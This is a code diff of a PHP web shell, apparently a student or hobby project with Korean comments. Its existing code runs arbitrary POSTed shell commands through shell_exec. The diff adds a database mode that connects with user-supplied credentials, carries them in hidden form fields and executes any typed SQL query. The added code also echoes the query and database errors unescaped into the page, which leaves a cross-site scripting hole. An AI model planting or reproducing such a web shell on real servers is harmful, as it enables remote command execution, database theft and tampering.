@@ -5,6 +5,13 @@
     $page = basename($_SERVER["PHP_SELF"]); //basename은 경로에서 모든 부분 다 짜르고 딱 파일명만 가져옴
     $fileName = isset($_GET["fileName"]) ? $_GET["fileName"] : "";
 
+    $dbHost = isset($_POST["dbHost"]) ? $_POST["dbHost"] : "";
+    $dbId = isset($_POST["dbId"]) ? $_POST["dbId"] : "";
+    $dbPw = isset($_POST["dbPw"]) ? $_POST["dbPw"] : "";
+    $dbName = isset($_POST["dbName"]) ? $_POST["dbName"] : "";
+    $query = isset($_POST["query"]) ? $_POST["query"] : "";
+
+
     if(empty($path)){
         $tempFileName = basename(__FILE__); // 현재 파일명을 basename으로 가져옴 -> magic constant 미리 정의된 상수
         $tempPath = realpath(__FILE__); // 절대 경로를 가져옴.
@@ -350,18 +357,122 @@
                 <br>
                 <p class="text-center"><button class="btn btn-default" type="submit">Execution</button></p>
             </form>
-                <?php
-                    if(!empty($_POST["command"])){
-                        echo "<hr>";
-                        $result = shell_exec($_POST["command"]);
-                        $result = str_replace("\n", "<br>", $result);
-                        // $result = iconv("CP949", "UTF-8", $result); //원래 인코딩값, 변경할 인코딩값, 대상  -> 맥북에서는 안 됨.
-                        echo $result;
-                    }
+            <?php
+                if(!empty($_POST["command"])){
+                    echo "<hr>";
+                    $result = shell_exec($_POST["command"]);
+                    $result = str_replace("\n", "<br>", $result);
+                    // $result = iconv("CP949", "UTF-8", $result); //원래 인코딩값, 변경할 인코딩값, 대상  -> 맥북에서는 안 됨.
+                    echo $result;
+                }
 
+            ?>
+        <?php  } else if($mode == "db") { ?>
+            <?php 
+                if(empty($dbHost) || empty($dbId) || empty($dbPw) || empty($dbName)){
+            ?>
+            <form action="<?php echo $page ?>?mode=db" method="POST">
+                <div class="input-group">
+                    <span class="input-group-addon">HOST</span>
+                    <input type="text" class="form-control" placeholder = "Host Input..." name="dbHost">
+                    <span class="input-group-addon">ID</span>
+                    <input type="text" class="form-control" placeholder = "ID Input..." name="dbId">
+                    <span class="input-group-addon">PW</span>
+                    <input type="password" class="form-control" placeholder = "PW Input..." name="dbPw">
+                    <span class="input-group-addon">DB</span>
+                    <input type="text" class="form-control" placeholder = "DB Input..." name="dbName">
+                </div>
+                <br>
+                <p class="text-center"><button class="btn btn-default" type="submit">Connect</button></p>
+            </form>
+
+            <?php
+                } 
+                else { 
+                    try {
+                        $dbConn = new mysqli($dbHost, $dbId, $dbPw, $dbName);
+                        
+                        // 연결 확인
+                        if ($dbConn->connect_errno) {
+                            throw new Exception("DB 연결 실패: " . $dbConn->connect_error);
+                        }
+                    } catch (Exception $e) {
+                        echo "<script>alert('DB 연결 실패'); history.back(-1);</script>";
+                        exit();
+                    }
+            ?>
+            <form action="<?php echo $page ?>?mode=db" method="POST">
+                <div class="input-group">
+                    <span class="input-group-addon">SQL</span>
+                    <input type="text" class="form-control" placeholder = "Query Input..." name="query" value="<?php echo $query ?>">
+                </div>
+                <br>
+                <p class="text-center"><button class="btn btn-default" type="submit">Execution</button></p>
+                <input type="hidden" name="dbHost" value="<?php echo $dbHost ?>">
+                <input type="hidden" name="dbId" value="<?php echo $dbId ?>">
+                <input type="hidden" name="dbPw" value="<?php echo $dbPw ?>">
+                <input type="hidden" name="dbName" value="<?php echo $dbName ?>">
+            </form>
+            <?php
+                if (!empty($query)) {
+                    $result = $dbConn->query($query);
+
+                    // 쿼리 실행 결과 확인
+                    if ($result === false) {
+                        echo "<script>alert('쿼리 실행 실패: " . $dbConn->error . "');</script>";
+                    } elseif ($result === true) {
+                        echo "<p class='text-success text-center'>쿼리 실행 성공 (영향 받은 행: " . $dbConn->affected_rows . ")</p>";
+                    } elseif ($result instanceof mysqli_result) {
+                        $rowCnt = $result->num_rows;
+
+                        if ($rowCnt > 0) {
                 ?>
+                            <table class="table table-bordered table-hover">
+                                <?php
+                                for ($i = 0; $i < $rowCnt; $i++) {
+                                    $row = $result->fetch_assoc();
+                                    if ($i == 0) {
+                                        $ratio = 100 / count($row);
+                                ?>
+                                        <thead>
+                                            <tr class="active">
+                                                <?php
+                                                foreach ($row as $key => $value) {
+                                                ?>
+                                                    <th style="width: <?php echo $ratio ?>%" class="text-center"><?php echo htmlspecialchars($key) ?></th>
+                                                <?php
+                                                }
+                                                ?>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                        <?php
+                                    }
+                                    echo "<tr>";
+                                    foreach ($row as $key => $value) {
+                                        ?>
+                                        <td style="vertical-align: middle" class="text-center"><?php echo htmlspecialchars($value) ?></td>
+                                        <?php
+                                    }
+                                    echo "</tr>";
+                                }
+                                        ?>
+                                        </tbody>
+                            </table>
+                <?php
+                        } else {
+                            echo "<p class='text-warning text-center'>쿼리 결과가 없습니다.</p>";
+                        }
+                        $result->free();
+                    }
+                }
+                ?>            
+            <?php } ?>
             
+
+        <!-- 모드 else if 구문 괄호 -->
         <?php } ?>
+        
         <hr>
         <p class="text-muted text-center">Copyright© 2025, Vak-kas, All rights reserved.</p>
     </div>
